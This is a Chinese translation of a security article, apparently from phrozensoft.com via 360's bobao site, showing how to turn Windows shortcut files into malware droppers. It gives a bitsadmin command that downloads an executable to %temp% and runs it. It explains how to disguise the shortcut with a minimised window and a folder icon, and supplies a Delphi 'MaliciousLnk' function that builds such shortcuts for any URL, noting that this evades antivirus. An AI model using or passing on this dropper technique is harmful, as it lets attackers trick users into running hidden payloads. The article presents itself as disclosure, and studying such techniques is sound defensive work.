# 【技术分享】将快捷方式打造成恶意软件入口（含演示视频）
|
##### 译文声明
本文是翻译文章，文章来源：phrozensoft.com
原文地址：
译文仅供参考，具体内容表达以及含义原文为准。
****
**翻译：**[ **shan66**
****](http://bobao.360.cn/member/contribute?uid=2522399780)
**预估稿费：200RMB（不服你也来投稿啊！）**
******投稿方式：发送邮件至**[ **linwei#360.cn**](mailto:PI:EMAIL) **，或登陆**[
**网页版**](http://bobao.360.cn/contribute/index) **在线投稿******
最近，安全研究人员发现了一种在Microsoft
Windows操作系统中通过快捷方式安装恶意软件的方法。我们对于快捷方式再熟悉不过了，几乎每个人都在用，并且大家都没有戒心。正是由于这些特点，使得这些恶意软件很难发现，同时，清除起来就更困难了。
**前言**
快捷方式并非二进制可执行文件，常用来指向其他地方的文件夹或文件。但是，它却可以执行Windows
shell命令（这可能是一个非常危险的功能，通常用于编程任务，如系统的关闭/注销/直接通过常规快捷方式重新启动等）。
由于快捷方式不是二进制可执行文件，所以防病毒程序通常也不会检测快捷方式是否是恶意的。
快捷方式可以通过归档文件共享，而不会丢失其属性。
最后，你可以轻松地更改图标，所以恶意快捷方式很容易伪装成文件夹图标或图像。这可能有助于恶意软件通过社交媒体进行传播。
**漏洞详述**
为了描述这种威胁，我们需要首先介绍一个本地的Windows程序，该程序名为BITSAdmin Tool，它可以嵌入到Windows XP
SP2之后的所有Windows系统中。关于这个程序的详细介绍，请访问MSDN链接：
。
简单来说，这个命令行工具主要用于创建下载任务并监视其进度。然而，使用这些命令行是非常危险的，因为Bitsadmin.exe带有微软签名，所以其他防病毒软件自然会对它放行，并且它能够以单独的命令行方式使用。
下面是BITSAdmin命令的一个例子：
    bitsadmin /transfer downloader /priority normal https://phrozensoft.com/uploads/2016/09/Winja_2_6084_65441_setup.exe %temp%setup.exe
现在，让我们使用这个命令行工具来利用一个新的Windows快捷方式。
**DIY，手动方式**
在资源管理器中（例如桌面上的空闲处）单击右键，然后单击“Create a new shortcut”菜单项。
然后，输入以下命令行：
    cmd.exe /C "%windir%System32bitsadmin.exe /transfer downloader /priority normal https://phrozensoft.com/uploads/2016/09/Winja_2_6084_65441_setup.exe %temp%setup.exe & %temp%setup.exe"
然后保存。
现在，在这个快捷方式上面单击右键，然后，选择属性。
将“Run”选项切换为“Run Minimized”
最后，将图标换为你最新喜欢的样子（例如文件夹图标）
为了在共享快捷方式时保持图标不变，建议使用shell32.dll的图标（因为所有Windows系统中都有shell32.dll）。
注意：在Microsoft系统中，除了shell32.dll之外，Ieframe.dll、imageres.dll、pnidui.dll、wmploc.dll等文件的图标也非常有用。
好了，恶意快捷方式现已准备就绪了。
**DIY，编程方式（Delphi）**
    uses ActiveX, ShlObj, ComObj;
    function MaliciousLnk(fileUrl, destFile : String) : Boolean;
    var cObject   : IUnknown;
        shellLink : IShellLink;
        PFile     : IPersistFile;
        LinkName  : string;
        Cmd       : String;
    begin
      result := false;
      CoInitialize(nil);
      try
        cObject := CreateComObject(CLSID_ShellLink);
        shellLink := cObject as IShellLink;
        PFile := cObject as IPersistFile;
        Cmd := '/C "c:windowssystem32bitsadmin.exe /transfer downloader /priority normal "' + fileURL + '" %temp%tmp.exe & %temp%tmp.exe"';
        shellLink.SetDescription('www.phrozensoft.com');
        shellLink.SetPath('cmd.exe');
        shellLink.SetArguments(PWideChar(cmd));
        shellLink.SetShowCmd(SW_SHOWMINNOACTIVE);
        shellLink.SetWorkingDirectory('%windir%system32');
        shellLink.SetIconLocation('shell32.dll', 1);
        result := PFile.Save(PWideChar(destFile), false) = S_OK;
      finally
        CoUninitialize();
      end;
    end;
注意，这种技术在Windows XP SP2到Windows 10（最新版本）的所有版本上面都有效，其中包括相应的服务器版本。
通过这种方法，黑客甚至不需要创建下载恶意软件的代码，从而可以逃避防病毒检测。这里没有用到任何二进制可执行文件！
这里的bitsadmin.exe只是用来说明Windows快捷方式用法的一个例子，可以这么说，凡是可以通过命令行方式做到的事情，都可以通过快捷方式做到，例如：
使用所有常规的Windows DOS命令
使用PowerShell来制作恶意代码
使用新版Windows 10的嵌入式Linux系统（仅限于已激活此选项的用户）
使用rundll32.exe调用DLL导出的函数
等等…
注意：对于不需要使用PowerShell的普通Windows用户（默认情况下已启用）来说，我们建议卸载该软件包。这样可以免受所有通过PowerShell安装恶意代码的恶意软件的攻击。